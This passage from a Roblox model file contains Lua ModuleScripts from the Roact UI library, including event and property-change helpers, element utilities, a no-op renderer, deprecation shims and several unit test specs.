				<Item class="ModuleScript" referent="RBX486D1683D1094534A5CC454D3B12E1D7">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Children</string>
						<string name="ScriptGuid">{5AF55588-D8DF-400A-B8E2-E4CC25580141}</string>
						<ProtectedString name="Source"><![CDATA[local Symbol = require(script.Parent.Parent.Symbol)

local Children = Symbol.named("Children")

return Children]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBXDEEB106E01EA412C83E6AE76429AAE0F">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Change</string>
						<string name="ScriptGuid">{EEB6CCEA-26B8-4EB8-825B-8091F1A03553}</string>
						<ProtectedString name="Source"><![CDATA[--[[
	Change is used to generate special prop keys that can be used to connect to
	GetPropertyChangedSignal.

	Generally, Change is indexed by a Roblox property name:

		Roact.createElement("TextBox", {
			[Roact.Change.Text] = function(rbx)
				print("The TextBox", rbx, "changed text to", rbx.Text)
			end,
		})
]]

local Type = require(script.Parent.Parent.Type)

local Change = {}

local changeMetatable = {
	__tostring = function(self)
		return ("RoactHostChangeEvent(%s)"):format(self.name)
	end,
}

setmetatable(Change, {
	__index = function(self, propertyName)
		local changeListener = {
			[Type] = Type.HostChangeEvent,
			name = propertyName,
		}

		setmetatable(changeListener, changeMetatable)
		Change[propertyName] = changeListener

		return changeListener
	end,
})

return Change
]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBX33453E709A3D4D45989C5ADE9CF317B3">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Event</string>
						<string name="ScriptGuid">{4124F775-C64D-451D-B398-E4E85D11FDC4}</string>
						<ProtectedString name="Source"><![CDATA[--[[
	Index into `Event` to get a prop key for attaching to an event on a Roblox
	Instance.

	Example:

		Roact.createElement("TextButton", {
			Text = "Hello, world!",

			[Roact.Event.MouseButton1Click] = function(rbx)
				print("Clicked", rbx)
			end
		})
]]

local Type = require(script.Parent.Parent.Type)

local Event = {}

local eventMetatable = {
	__tostring = function(self)
		return ("RoactHostEvent(%s)"):format(self.name)
	end,
}

setmetatable(Event, {
	__index = function(self, eventName)
		local event = {
			[Type] = Type.HostEvent,
			name = eventName,
		}

		setmetatable(event, eventMetatable)

		Event[eventName] = event

		return event
	end,
})

return Event
]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBX19624A3EEB634560AAE14A0099075600">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Ref</string>
						<string name="ScriptGuid">{562722AB-E80C-4ED7-BE36-DED483B44224}</string>
						<ProtectedString name="Source"><![CDATA[local Symbol = require(script.Parent.Parent.Symbol)

local Ref = Symbol.named("Ref")

return Ref]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
			</Item>
			<Item class="ModuleScript" referent="RBXEB68668681DC454BB0C6FEDE6D9920D2">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">ComponentLifecyclePhase</string>
					<string name="ScriptGuid">{1BABAB59-81E7-434F-AEC2-4B6541B50133}</string>
					<ProtectedString name="Source"><![CDATA[local Symbol = require(script.Parent.Symbol)
local strict = require(script.Parent.strict)

local ComponentLifecyclePhase = strict({
	-- Component methods
	Init = Symbol.named("init"),
	Render = Symbol.named("render"),
	ShouldUpdate = Symbol.named("shouldUpdate"),
	WillUpdate = Symbol.named("willUpdate"),
	DidMount = Symbol.named("didMount"),
	DidUpdate = Symbol.named("didUpdate"),
	WillUnmount = Symbol.named("willUnmount"),

	-- Phases describing reconciliation status
	ReconcileChildren = Symbol.named("reconcileChildren"),
	Idle = Symbol.named("idle"),
}, "ComponentLifecyclePhase")

return ComponentLifecyclePhase]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX89ED8828779C48AF98B4BDB70E01603C">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">ElementUtils</string>
					<string name="ScriptGuid">{A96F62A6-3501-4D93-9427-93366C5B5F71}</string>
					<ProtectedString name="Source"><![CDATA[local Type = require(script.Parent.Type)
local Symbol = require(script.Parent.Symbol)

local function noop()
	return nil
end

local ElementUtils = {}

--[[
	A signal value indicating that a child should use its parent's key, because
	it has no key of its own.

	This occurs when you return only one element from a function component or
	stateful render function.
]]
ElementUtils.UseParentKey = Symbol.named("UseParentKey")

--[[
	Returns an iterator over the children of an element.
	`elementOrElements` may be one of:
	* a boolean
	* nil
	* a single element
	* a fragment
	* a table of elements

	If `elementOrElements` is a boolean or nil, this will return an iterator with
	zero elements.

	If `elementOrElements` is a single element, this will return an iterator with
	one element: a tuple where the first value is ElementUtils.UseParentKey, and
	the second is the value of `elementOrElements`.

	If `elementOrElements` is a fragment or a table, this will return an iterator
	over all the elements of the array.

	If `elementOrElements` is none of the above, this function will throw.
]]
function ElementUtils.iterateElements(elementOrElements)
	local richType = Type.of(elementOrElements)

	-- Single child
	if richType == Type.Element then
		local called = false

		return function()
			if called then
				return nil
			else
				called = true
				return ElementUtils.UseParentKey, elementOrElements
			end
		end
	end

	local regularType = typeof(elementOrElements)

	if elementOrElements == nil or regularType == "boolean" then
		return noop
	end

	if regularType == "table" then
		return pairs(elementOrElements)
	end

	error("Invalid elements")
end

--[[
	Gets the child corresponding to a given key, respecting Roact's rules for
	children. Specifically:
	* If `elements` is nil or a boolean, this will return `nil`, regardless of
		the key given.
	* If `elements` is a single element, this will return `nil`, unless the key
		is ElementUtils.UseParentKey.
	* If `elements` is a table of elements, this will return `elements[key]`.
]]
function ElementUtils.getElementByKey(elements, hostKey)
	if elements == nil or typeof(elements) == "boolean" then
		return nil
	end

	if Type.of(elements) == Type.Element then
		if hostKey == ElementUtils.UseParentKey then
			return elements
		end

		return nil
	end

	if typeof(elements) == "table" then
		return elements[hostKey]
	end

	error("Invalid elements")
end

return ElementUtils]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXC161A785714C4D90B310FCFD43A51401">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">oneChild</string>
					<string name="ScriptGuid">{416F1834-9B47-4E47-B218-5C42D3281E4D}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	Retrieves at most one child from the children passed to a component.

	If passed nil or an empty table, will return nil.

	Throws an error if passed more than one child.
]]
local function oneChild(children)
	if not children then
		return nil
	end

	local key, child = next(children)

	if not child then
		return nil
	end

	local after = next(children, key)

	if after then
		error("Expected at most child, had more than one child.", 2)
	end

	return child
end

return oneChild]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX924D294427DA4BEB8ACFF8BE3351E424">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">SingleEventManager</string>
					<string name="ScriptGuid">{97EEF783-F3A5-4545-A288-BFDDCF5841CE}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	A manager for a single host virtual node's connected events.
]]

local Logging = require(script.Parent.Logging)

local CHANGE_PREFIX = "Change."

local EventStatus = {
	-- No events are processed at all; they're silently discarded
	Disabled = "Disabled",

	-- Events are stored in a queue; listeners are invoked when the manager is resumed
	Suspended = "Suspended",

	-- Event listeners are invoked as the events fire
	Enabled = "Enabled",
}

local SingleEventManager = {}
SingleEventManager.__index = SingleEventManager

function SingleEventManager.new(instance)
	local self = setmetatable({
		-- The queue of suspended events
		_suspendedEventQueue = {},

		-- All the event connections being managed
		-- Events are indexed by a string key
		_connections = {},

		-- All the listeners being managed
		-- These are stored distinctly from the connections
		-- Connections can have their listeners replaced at runtime
		_listeners = {},

		-- The suspension status of the manager
		-- Managers start disabled and are "resumed" after the initial render
		_status = EventStatus.Disabled,

		-- If true, the manager is processing queued events right now.
		_isResuming = false,

		-- The Roblox instance the manager is managing
		_instance = instance,
	}, SingleEventManager)

	return self
end

function SingleEventManager:connectEvent(key, listener)
	self:_connect(key, self._instance[key], listener)
end

function SingleEventManager:connectPropertyChange(key, listener)
	local success, event = pcall(function()
		return self._instance:GetPropertyChangedSignal(key)
	end)

	if not success then
		error(("Cannot get changed signal on property %q: %s"):format(
			tostring(key),
			event
		), 0)
	end

	self:_connect(CHANGE_PREFIX .. key, event, listener)
end

function SingleEventManager:_connect(eventKey, event, listener)
	-- If the listener doesn't exist we can just disconnect the existing connection
	if listener == nil then
		if self._connections[eventKey] ~= nil then
			self._connections[eventKey]:Disconnect()
			self._connections[eventKey] = nil
		end

		self._listeners[eventKey] = nil
	else
		if self._connections[eventKey] == nil then
			self._connections[eventKey] = event:Connect(function(...)
				if self._status == EventStatus.Enabled then
					self._listeners[eventKey](self._instance, ...)
				elseif self._status == EventStatus.Suspended then
					-- Store this event invocation to be fired when resume is
					-- called.

					local argumentCount = select("#", ...)
					table.insert(self._suspendedEventQueue, { eventKey, argumentCount, ... })
				end
			end)
		end

		self._listeners[eventKey] = listener
	end
end

function SingleEventManager:suspend()
	self._status = EventStatus.Suspended
end

function SingleEventManager:resume()
	-- If we're already resuming events for this instance, trying to resume
	-- again would cause a disaster.
	if self._isResuming then
		return
	end

	self._isResuming = true

	local index = 1

	-- More events might be added to the queue when evaluating events, so we
	-- need to be careful in order to preserve correct evaluation order.
	while index <= #self._suspendedEventQueue do
		local eventInvocation = self._suspendedEventQueue[index]
		local listener = self._listeners[eventInvocation[1]]
		local argumentCount = eventInvocation[2]

		-- The event might have been disconnected since suspension started; in
		-- this case, we drop the event.
		if listener ~= nil then
			-- Wrap the listener in a coroutine to catch errors and handle
			-- yielding correctly.
			local listenerCo = coroutine.create(listener)
			local success, result = coroutine.resume(
				listenerCo,
				self._instance,
				unpack(eventInvocation, 3, 2 + argumentCount))

			-- If the listener threw an error, we log it as a warning, since
			-- there's no way to write error text in Roblox Lua without killing
			-- our thread!
			if not success then
				Logging.warn("%s", result)
			end
		end

		index = index + 1
	end

	self._isResuming = false
	self._status = EventStatus.Enabled
	self._suspendedEventQueue = {}
end

return SingleEventManager]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXF3F292C8B7F741F5BA0F80E4D26BFF0B">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createContext.spec</string>
					<string name="ScriptGuid">{01F986BC-E134-4CEB-90A8-6858201A351B}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local Component = require(script.Parent.Component)
	local NoopRenderer = require(script.Parent.NoopRenderer)
	local Children = require(script.Parent.PropMarkers.Children)
	local createContext = require(script.Parent.createContext)
	local createElement = require(script.Parent.createElement)
	local createFragment = require(script.Parent.createFragment)
	local createReconciler = require(script.Parent.createReconciler)
	local createSpy = require(script.Parent.createSpy)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should return a table", function()
		local context = createContext("Test")
		expect(context).to.be.ok()
		expect(type(context)).to.equal("table")
	end)

	it("should contain a Provider and a Consumer", function()
		local context = createContext("Test")
		expect(context.Provider).to.be.ok()
		expect(context.Consumer).to.be.ok()
	end)

	describe("Provider", function()
		it("should render its children", function()
			local context = createContext("Test")

			local Listener = createSpy(function()
				return nil
			end)

			local element = createElement(context.Provider, {
				value = "Test",
			}, {
				Listener = createElement(Listener.value),
			})

			local tree = noopReconciler.mountVirtualTree(element, nil, "Provide Tree")
			noopReconciler.unmountVirtualTree(tree)

			expect(Listener.callCount).to.equal(1)
		end)
	end)

	describe("Consumer", function()
		it("should expect a render function", function()
			local context = createContext("Test")
			local element = createElement(context.Consumer)

			expect(function()
				noopReconciler.mountVirtualTree(element, nil, "Provide Tree")
			end).to.throw()
		end)

		it("should return the default value if there is no Provider", function()
			local valueSpy = createSpy()
			local context = createContext("Test")

			local element = createElement(context.Consumer, {
				render = valueSpy.value,
			})

			local tree = noopReconciler.mountVirtualTree(element, nil, "Provide Tree")
			noopReconciler.unmountVirtualTree(tree)

			valueSpy:assertCalledWith("Test")
		end)

		it("should pass the value to the render function", function()
			local valueSpy = createSpy()
			local context = createContext("Test")

			local function Listener()
				return createElement(context.Consumer, {
					render = valueSpy.value,
				})
			end

			local element = createElement(context.Provider, {
				value = "NewTest",
			}, {
				Listener = createElement(Listener),
			})

			local tree = noopReconciler.mountVirtualTree(element, nil, "Provide Tree")
			noopReconciler.unmountVirtualTree(tree)

			valueSpy:assertCalledWith("NewTest")
		end)

		it("should update when the value updates", function()
			local valueSpy = createSpy()
			local context = createContext("Test")

			local function Listener()
				return createElement(context.Consumer, {
					render = valueSpy.value,
				})
			end

			local element = createElement(context.Provider, {
				value = "NewTest",
			}, {
				Listener = createElement(Listener),
			})

			local tree = noopReconciler.mountVirtualTree(element, nil, "Provide Tree")

			expect(valueSpy.callCount).to.equal(1)
			valueSpy:assertCalledWith("NewTest")

			noopReconciler.updateVirtualTree(tree, createElement(context.Provider, {
				value = "ThirdTest",
			}, {
				Listener = createElement(Listener),
			}))

			expect(valueSpy.callCount).to.equal(2)
			valueSpy:assertCalledWith("ThirdTest")

			noopReconciler.unmountVirtualTree(tree)
		end)

		--[[
			This test is the same as the one above, but with a component that
			always blocks updates in the middle. We expect behavior to be the
			same.
		]]
		it("should update when the value updates through an update blocking component", function()
			local valueSpy = createSpy()
			local context = createContext("Test")

			local UpdateBlocker = Component:extend("UpdateBlocker")

			function UpdateBlocker:render()
				return createFragment(self.props[Children])
			end

			function UpdateBlocker:shouldUpdate()
				return false
			end

			local function Listener()
				return createElement(context.Consumer, {
					render = valueSpy.value,
				})
			end

			local element = createElement(context.Provider, {
				value = "NewTest",
			}, {
				Blocker = createElement(UpdateBlocker, nil, {
					Listener = createElement(Listener),
				}),
			})

			local tree = noopReconciler.mountVirtualTree(element, nil, "Provide Tree")

			expect(valueSpy.callCount).to.equal(1)
			valueSpy:assertCalledWith("NewTest")

			noopReconciler.updateVirtualTree(tree, createElement(context.Provider, {
				value = "ThirdTest",
			}, {
				Blocker = createElement(UpdateBlocker, nil, {
					Listener = createElement(Listener),
				}),
			}))

			expect(valueSpy.callCount).to.equal(2)
			valueSpy:assertCalledWith("ThirdTest")

			noopReconciler.unmountVirtualTree(tree)
		end)

		it("should behave correctly when the default value is nil", function()
			local context = createContext(nil)

			local valueSpy = createSpy()
			local function Listener()
				return createElement(context.Consumer, {
					render = valueSpy.value,
				})
			end

			local tree = noopReconciler.mountVirtualTree(createElement(Listener), nil, "Provide Tree")
			expect(valueSpy.callCount).to.equal(1)
			valueSpy:assertCalledWith(nil)

			tree = noopReconciler.updateVirtualTree(tree, createElement(Listener))
			noopReconciler.unmountVirtualTree(tree)

			expect(valueSpy.callCount).to.equal(2)
			valueSpy:assertCalledWith(nil)
		end)
	end)

	describe("Update order", function()
		--[[
			This test ensures that there is no scenario where we can observe
			'update tearing' when props and context are updated at the same
			time.

			Update tearing is scenario where a single update is partially
			applied in multiple steps instead of atomically. This is observable
			by components and can lead to strange bugs or errors.

			This instance of update tearing happens when updating a prop and a
			context value in the same update. Image we represent our tree's
			state as the current prop and context versions. Our initial state
			is:

			(prop_1, context_1)

			The next state we would like to update to is:

			(prop_2, context_2)

			Under the bug reported in issue 259, Roact reaches three different
			states in sequence:

			1: (prop_1, context_1) - the initial state
			2: (prop_2, context_1) - woops!
			3: (prop_2, context_2) - correct end state

			In state 2, a user component was added that tried to access the
			current context value, which was not set at the time. This raised an
			error, because this state is not valid!

			The first proposed solution was to move the context update to happen
			before the props update. It is easy to show that this will still
			result in update tearing:

			1: (prop_1, context_1)
			2: (prop_1, context_2)
			3: (prop_2, context_2)

			Although the initial concern about newly added components observing
			old context values is fixed, there is still a state
			desynchronization between props and state.

			We would instead like the following update sequence:

			1: (prop_1, context_1)
			2: (prop_2, context_2)

			This test tries to ensure that is the case.

			The initial bug report is here:
			https://github.com/Roblox/roact/issues/259
		]]
		it("should update context at the same time as props", function()
			-- These values are used to make sure we reach both the first and
			-- second state combinations we want to visit.
			local observedA = false
			local observedB = false
			local updateCount = 0

			local context = createContext("default")

			local function Listener(props)
				return createElement(context.Consumer, {
					render = function(value)
						updateCount = updateCount + 1

						if value == "context_1" then
							expect(props.someProp).to.equal("prop_1")
							observedA = true
						elseif value == "context_2" then
							expect(props.someProp).to.equal("prop_2")
							observedB = true
						else
							error("Unexpected context value")
						end
					end,
				})
			end

			local element1 = createElement(context.Provider, {
				value = "context_1",
			}, {
				Child = createElement(Listener, {
					someProp = "prop_1",
				}),
			})

			local element2 = createElement(context.Provider, {
				value = "context_2",
			}, {
				Child = createElement(Listener, {
					someProp = "prop_2",
				}),
			})

			local tree = noopReconciler.mountVirtualTree(element1, nil, "UpdateObservationIsFun")
			noopReconciler.updateVirtualTree(tree, element2)

			expect(updateCount).to.equal(2)
			expect(observedA).to.equal(true)
			expect(observedB).to.equal(true)
		end)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXC188C8D9F0F0487489197F9478559EF1">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">PureComponent.spec</string>
					<string name="ScriptGuid">{42669AAF-C62C-4E1D-96FF-FD249AD08C8D}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local createElement = require(script.Parent.createElement)
	local NoopRenderer = require(script.Parent.NoopRenderer)
	local createReconciler = require(script.Parent.createReconciler)

	local PureComponent = require(script.Parent.PureComponent)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should be extendable", function()
		local MyComponent = PureComponent:extend("MyComponent")

		expect(MyComponent).to.be.ok()
	end)

	it("should skip updates for shallow-equal props", function()
		local updateCount = 0
		local setValue

		local PureChild = PureComponent:extend("PureChild")

		function PureChild:willUpdate()
			updateCount = updateCount + 1
		end

		function PureChild:render()
			return nil
		end

		local PureContainer = PureComponent:extend("PureContainer")

		function PureContainer:init()
			self.state = {
				value = 0,
			}
		end

		function PureContainer:didMount()
			setValue = function(value)
				self:setState({
					value = value,
				})
			end
		end

		function PureContainer:render()
			return createElement(PureChild, {
				value = self.state.value,
			})
		end

		local element = createElement(PureContainer)
		local tree = noopReconciler.mountVirtualTree(element, nil, "PureComponent Tree")

		expect(updateCount).to.equal(0)

		setValue(1)

		expect(updateCount).to.equal(1)

		setValue(1)

		expect(updateCount).to.equal(1)

		setValue(2)

		expect(updateCount).to.equal(2)

		setValue(1)

		expect(updateCount).to.equal(3)

		noopReconciler.unmountVirtualTree(tree)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX227E6D577F774B38AFE1BFFBE54F262C">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">getDefaultInstanceProperty</string>
					<string name="ScriptGuid">{1FECA066-A3D5-4180-AAE1-4F1720479011}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	Attempts to get the default value of a given property on a Roblox instance.

	This is used by the reconciler in cases where a prop was previously set on a
	primitive component, but is no longer present in a component's new props.

	Eventually, Roblox might provide a nicer API to query the default property
	of an object without constructing an instance of it.
]]

local Symbol = require(script.Parent.Symbol)

local Nil = Symbol.named("Nil")
local _cachedPropertyValues = {}

local function getDefaultInstanceProperty(className, propertyName)
	local classCache = _cachedPropertyValues[className]

	if classCache then
		local propValue = classCache[propertyName]

		-- We have to use a marker here, because Lua doesn't distinguish
		-- between 'nil' and 'not in a table'
		if propValue == Nil then
			return true, nil
		end

		if propValue ~= nil then
			return true, propValue
		end
	else
		classCache = {}
		_cachedPropertyValues[className] = classCache
	end

	local created = Instance.new(className)
	local ok, defaultValue = pcall(function()
		return created[propertyName]
	end)

	created:Destroy()

	if ok then
		if defaultValue == nil then
			classCache[propertyName] = Nil
		else
			classCache[propertyName] = defaultValue
		end
	end

	return ok, defaultValue
end

return getDefaultInstanceProperty]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX1C3CC402A624477B82F4F1E1267BDA6F">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createFragment</string>
					<string name="ScriptGuid">{47D2B221-783A-459B-A05A-3B1DB997E266}</string>
					<ProtectedString name="Source"><![CDATA[local ElementKind = require(script.Parent.ElementKind)
local Type = require(script.Parent.Type)

local function createFragment(elements)
	return {
		[Type] = Type.Element,
		[ElementKind] = ElementKind.Fragment,
		elements = elements,
	}
end

return createFragment]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX8ACC5097246545F18D8241CB0654A1E4">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">oneChild.spec</string>
					<string name="ScriptGuid">{1D14C8E2-3D28-450C-B607-B96D813FEEEA}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local createElement = require(script.Parent.createElement)

	local oneChild = require(script.Parent.oneChild)

	it("should get zero children from a table", function()
		local children = {}

		expect(oneChild(children)).to.equal(nil)
	end)

	it("should get exactly one child", function()
		local child = createElement("Frame")
		local children = {
			foo = child,
		}

		expect(oneChild(children)).to.equal(child)
	end)

	it("should error with more than one child", function()
		local children = {
			a = createElement("Frame"),
			b = createElement("Frame"),
		}

		expect(function()
			oneChild(children)
		end).to.throw()
	end)

	it("should handle being passed nil", function()
		expect(oneChild(nil)).to.equal(nil)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXD123ADDA02C9484CA9568940DD985109">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">NoopRenderer</string>
					<string name="ScriptGuid">{44500FAD-6810-40E4-8BF2-2AC6960B561D}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	Reference renderer intended for use in tests as well as for documenting the
	minimum required interface for a Roact renderer.
]]

local NoopRenderer = {}

function NoopRenderer.isHostObject(target)
	-- Attempting to use NoopRenderer to target a Roblox instance is almost
	-- certainly a mistake.
	return target == nil
end

function NoopRenderer.mountHostNode(reconciler, node)
end

function NoopRenderer.unmountHostNode(reconciler, node)
end

function NoopRenderer.updateHostNode(reconciler, node, newElement)
	return node
end

return NoopRenderer]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX9F3B972134B24EC3877CA082D2EC847D">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">assertDeepEqual.spec</string>
					<string name="ScriptGuid">{68D69812-602D-4BE5-9E44-7CB625EF4AA0}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local assertDeepEqual = require(script.Parent.assertDeepEqual)

	it("should fail with a message when args are not equal", function()
		local success, message = pcall(assertDeepEqual, 1, 2)

		expect(success).to.equal(false)
		expect(message:find("first ~= second")).to.be.ok()

		success, message = pcall(assertDeepEqual, {
			foo = 1,
		}, {
			foo = 2,
		})

		expect(success).to.equal(false)
		expect(message:find("first%[foo%] ~= second%[foo%]")).to.be.ok()
	end)

	it("should compare non-table values using standard '==' equality", function()
		assertDeepEqual(1, 1)
		assertDeepEqual("hello", "hello")
		assertDeepEqual(nil, nil)

		local someFunction = function() end
		local theSameFunction = someFunction

		assertDeepEqual(someFunction, theSameFunction)

		local A = {
			foo = someFunction
		}
		local B = {
			foo = theSameFunction
		}

		assertDeepEqual(A, B)
	end)

	it("should fail when types differ", function()
		local success, message = pcall(assertDeepEqual, 1, "1")

		expect(success).to.equal(false)
		expect(message:find("first is of type number, but second is of type string")).to.be.ok()
	end)

	it("should compare (and report about) nested tables", function()
		local A = {
			foo = "bar",
			nested = {
				foo = 1,
				bar = 2,
			}
		}
		local B = {
			foo = "bar",
			nested = {
				foo = 1,
				bar = 2,
			}
		}

		assertDeepEqual(A, B)

		local C = {
			foo = "bar",
			nested = {
				foo = 1,
				bar = 3,
			}
		}

		local success, message = pcall(assertDeepEqual, A, C)

		expect(success).to.equal(false)
		expect(message:find("first%[nested%]%[bar%] ~= second%[nested%]%[bar%]")).to.be.ok()
	end)

	it("should be commutative", function()
		local equalArgsA = {
			foo = "bar",
			hello = "world",
		}
		local equalArgsB = {
			foo = "bar",
			hello = "world",
		}

		assertDeepEqual(equalArgsA, equalArgsB)
		assertDeepEqual(equalArgsB, equalArgsA)

		local nonEqualArgs = {
			foo = "bar",
		}

		expect(function() assertDeepEqual(equalArgsA, nonEqualArgs) end).to.throw()
		expect(function() assertDeepEqual(nonEqualArgs, equalArgsA) end).to.throw()
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX575F5FBED0DC47718E0DBED68F5D9487">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">assign.spec</string>
					<string name="ScriptGuid">{9B496740-464C-40DA-9E9B-AA5DFBE615E3}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local None = require(script.Parent.None)

	local assign = require(script.Parent.assign)

	it("should accept zero additional tables", function()
		local input = {}
		local result = assign(input)

		expect(input).to.equal(result)
	end)

	it("should merge multiple tables onto the given target table", function()
		local target = {
			a = 5,
			b = 6,
		}

		local source1 = {
			b = 7,
			c = 8,
		}

		local source2 = {
			b = 8,
		}

		assign(target, source1, source2)

		expect(target.a).to.equal(5)
		expect(target.b).to.equal(source2.b)
		expect(target.c).to.equal(source1.c)
	end)

	it("should remove keys if specified as None", function()
		local target = {
			foo = 2,
			bar = 3,
		}

		local source = {
			foo = None,
		}

		assign(target, source)

		expect(target.foo).to.equal(nil)
		expect(target.bar).to.equal(3)
	end)

	it("should re-add keys if specified after None", function()
		local target = {
			foo = 2,
		}

		local source1 = {
			foo = None,
		}

		local source2 = {
			foo = 3,
		}

		assign(target, source1, source2)

		expect(target.foo).to.equal(source2.foo)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX2564CA82087A4A41B4C64F5F4653D14A">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createReconcilerCompat</string>
					<string name="ScriptGuid">{44BADE2A-26BC-4F42-AD5A-9C8492E778C9}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	Contains deprecated methods from Reconciler. Broken out so that removing
	this shim is easy -- just delete this file and remove it from init.
]]

local Logging = require(script.Parent.Logging)

local reifyMessage = [[
Roact.reify has been renamed to Roact.mount and will be removed in a future release.
Check the call to Roact.reify at:
]]

local teardownMessage = [[
Roact.teardown has been renamed to Roact.unmount and will be removed in a future release.
Check the call to Roact.teardown at:
]]

local reconcileMessage = [[
Roact.reconcile has been renamed to Roact.update and will be removed in a future release.
Check the call to Roact.reconcile at:
]]

local function createReconcilerCompat(reconciler)
	local compat = {}

	function compat.reify(...)
		Logging.warnOnce(reifyMessage)

		return reconciler.mountVirtualTree(...)
	end

	function compat.teardown(...)
		Logging.warnOnce(teardownMessage)

		return reconciler.unmountVirtualTree(...)
	end

	function compat.reconcile(...)
		Logging.warnOnce(reconcileMessage)

		return reconciler.updateVirtualTree(...)
	end

	return compat
end

return createReconcilerCompat]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX303ADBAE673C4E32B681B489E42444D4">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Config</string>
					<string name="ScriptGuid">{EA38CA97-65D7-4B81-A84E-C5D747FF7B10}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	Exposes an interface to set global configuration values for Roact.

	Configuration can only occur once, and should only be done by an application
	using Roact, not a library.

	Any keys that aren't recognized will cause errors. Configuration is only
	intended for configuring Roact itself, not extensions or libraries.

	Configuration is expected to be set immediately after loading Roact. Setting
	configuration values after an application starts may produce unpredictable
	behavior.
]]

